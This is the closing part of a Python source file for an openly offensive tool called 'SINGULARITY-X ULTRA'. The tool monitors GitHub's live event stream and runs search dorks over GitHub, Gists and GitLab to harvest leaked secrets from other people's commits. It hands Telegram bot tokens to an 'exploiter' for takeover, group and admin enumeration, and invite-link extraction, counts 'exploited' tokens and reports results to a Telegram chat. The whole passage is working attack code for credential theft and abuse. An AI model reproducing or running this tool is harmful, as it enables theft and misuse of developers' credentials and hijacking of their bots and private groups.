                    repo = event.get('repo', {}).get('name', '')
                    payload = event.get('payload', {})
                    
                    for commit in payload.get('commits', []):
                        commit_url = commit.get('url', '')
                        if commit_url:
                            tasks.append(process_commit(session, commit_url, repo, exploiter))
                
                elif event_type == 'CreateEvent':
                    # New repo/branch created - scan it
                    repo = event.get('repo', {}).get('name', '')
                    tasks.append(scan_new_repo(session, repo, exploiter))
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            await asyncio.sleep(2)  # Check events every 2 seconds
            
        except Exception as e:
            print(f"[✗] Real-time monitor error: {e}")
            await asyncio.sleep(5)

async def process_commit(session: aiohttp.ClientSession, commit_url: str, 
                         repo: str, exploiter: TelegramExploiter):
    """Process a single commit for secrets"""
    commit_data = await gh_scanner.get_commit_details(session, commit_url)
    
    for file in commit_data.get('files', []):
        patch = file.get('patch', '')
        filename = file.get('filename', '')
        
        # Check file extension
        ext = filename.split('.')[-1] if '.' in filename else ''
        if ext in EXTENSIONS or any(k in filename.lower() for k in KEYWORDS):
            for token_type, pattern in TOKEN_PATTERNS.items():
                matches = set(re.findall(pattern, patch))
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]
                    
                    if token_type == 'telegram_bot':
                        await exploiter.exploit_bot(session, match, 
                                                   f"https://github.com/{repo}", 
                                                   "REALTIME_PUSH")
                    else:
                        db.insert_token(match, token_type, 
                                       f"https://github.com/{repo}", "REALTIME_PUSH")

async def scan_new_repo(session: aiohttp.ClientSession, repo: str, 
                        exploiter: TelegramExploiter):
    """Scan newly created repository"""
    contents = await gh_scanner.get_repo_contents(session, repo)
    
    for item in contents:
        if item.get('type') == 'file':
            path = item.get('path', '')
            ext = path.split('.')[-1] if '.' in path else ''
            
            if ext in EXTENSIONS or any(k in path.lower() for k in KEYWORDS):
                # Process as code search item
                await gh_scanner.deep_blame_analysis(session, {
                    'repository': {'full_name': repo},
                    'path': path,
                    'html_url': item.get('html_url', '')
                }, exploiter)

async def targeted_search(session: aiohttp.ClientSession, exploiter: TelegramExploiter):
    """Targeted search using dorks and extensions"""
    print("[🔍] Targeted search started")
    
    # Combine dorks with extensions
    search_queries = []
    
    # Add predefined dorks
    search_queries.extend(GITHUB_DORKS)
    
    # Generate extension-based queries
    for ext in EXTENSIONS[:10]:  # Limit to prevent too many queries
        for key in KEYWORDS[:5]:
            search_queries.append(f"extension:{ext}+{key}")
    
    while True:
        # Shuffle for randomness
        random.shuffle(search_queries)
        
        for query in search_queries:
            try:
                print(f"[🔍] Searching: {query[:60]}...")
                items = await gh_scanner.scan_code_search(session, query)
                
                if items:
                    print(f"[+] Found {len(items)} results")
                    
                    # Process in batches
                    batch_size = SCAN_CFG.BATCH_SIZE
                    for i in range(0, len(items), batch_size):
                        batch = items[i:i+batch_size]
                        tasks = [gh_scanner.deep_blame_analysis(session, item, exploiter) 
                                for item in batch]
                        await asyncio.gather(*tasks, return_exceptions=True)
                
                # Small delay between searches
                await asyncio.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"[✗] Search error: {e}")
                await asyncio.sleep(5)
        
        # Refresh queries periodically
        await asyncio.sleep(30)

async def multi_platform_task(session: aiohttp.ClientSession, exploiter: TelegramExploiter):
    """Run multi-platform scanning"""
    while True:
        try:
            await multi_scanner.scan_gists(session, exploiter)
            await multi_scanner.scan_gitlab(session, exploiter)
            await asyncio.sleep(60)
        except Exception as e:
            print(f"[✗] Multi-platform error: {e}")
            await asyncio.sleep(30)

async def stats_reporter():
    """Periodic stats reporting"""
    while True:
        await asyncio.sleep(300)  # Every 5 minutes
        
        runtime = time.time() - STATS['start_time'] if STATS['start_time'] else 0
        db_stats = db.get_stats()
        
        report = f"""
📊 **SINGULARITY-X STATISTICS** (Runtime: {runtime/60:.1f} min)

🌐 Session Stats:
  • Requests Made: {STATS['requests_made']:,}
  • Tokens Found: {STATS['tokens_found']:,}
  • Valid Tokens: {STATS['valid_tokens']:,}
  • Errors: {STATS['errors']:,}

💾 Database Stats:
  • Total Tokens: {db_stats.get('total_tokens', 0):,}
  • Validated: {db_stats.get('valid_tokens', 0):,}
  • Exploited: {db_stats.get('exploited_tokens', 0):,}
  • Groups Found: {db_stats.get('total_groups', 0):,}
  • Repos Scanned: {db_stats.get('repos_scanned', 0):,}
        """
        
        print(report)
        try:
            await client.send_message(Config.LOG_CHAT, report)
        except:
            pass

async def singularity_ultra():
    """Main ultra engine"""
    global client
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   💀 SINGULARITY-X ULTRA v2.0 - ADVANCED EDITION 💀      ║
    ║                                                           ║
    ║   Features:                                               ║
    ║   • Multi-pattern token detection (50+ patterns)         ║
    ║   • Deep commit history analysis                         ║
    ║   • Real-time GitHub event monitoring                    ║
    ║   • Advanced Telegram exploitation                       ║
    ║   • Multi-platform scanning (GitHub, GitLab, Gists)      ║
    ║   • Persistent SQLite intelligence DB                    ║
    ║   • Invite link extraction & admin enumeration           ║
    ║   • Intelligent rate limiting & token rotation           ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    STATS['start_time'] = time.time()
    
    # Initialize Telegram client properly
    await client.start(bot_token=Config.BOT_TOKEN)
    print("[✓] Telegram client connected")
    
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(limit=SCAN_CFG.MAX_CONCURRENT_REQUESTS),
        timeout=aiohttp.ClientTimeout(total=300)
    ) as session:
        
        # Start all tasks concurrently
        tasks = [
            asyncio.create_task(realtime_monitor(session, exploiter)),
            asyncio.create_task(targeted_search(session, exploiter)),
            asyncio.create_task(multi_platform_task(session, exploiter)),
            asyncio.create_task(stats_reporter()),
        ]
        
        print("[✓] All scanning modules started")
        print("[⚡] System running at ultra speed...")
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        client.loop.run_until_complete(singularity_ultra())
    except KeyboardInterrupt:
        print("\n[💀] Singularity-X Ultra shutting down...")
        stats = db.get_stats()
        print(f"[📊] Final stats: {stats}")
    except Exception as e:
        print(f"[✗] Fatal error: {e}")
